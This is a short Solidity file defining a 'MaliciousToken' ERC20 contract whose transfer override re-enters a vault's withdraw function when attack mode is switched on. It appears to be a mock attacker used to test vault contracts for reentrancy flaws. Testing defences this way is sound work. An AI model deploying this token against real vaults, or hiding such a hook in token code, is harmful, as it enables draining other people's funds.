// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IVault {
    function withdraw(uint256 amount) external;
    function deposit(uint256 amount) external;
}

contract MaliciousToken is ERC20 {
    IVault public vault;
    bool public attackMode;

    constructor() ERC20("Malicious", "MAL") {
        _mint(msg.sender, 1000000 * 10 ** decimals());
    }

    function setVault(address _vault) external {
        vault = IVault(_vault);
    }

    function enableAttack(bool _enable) external {
        attackMode = _enable;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        if (attackMode && address(vault) != address(0) && msg.sender == address(vault)) {
            // If vault is sending tokens (during withdraw), try to re-enter withdraw
            // Only do it once to avoid infinite loop gas limit if not protected?
            attackMode = false; // Stop recursive
            vault.withdraw(amount);
        }
        return super.transfer(to, amount);
    }
}
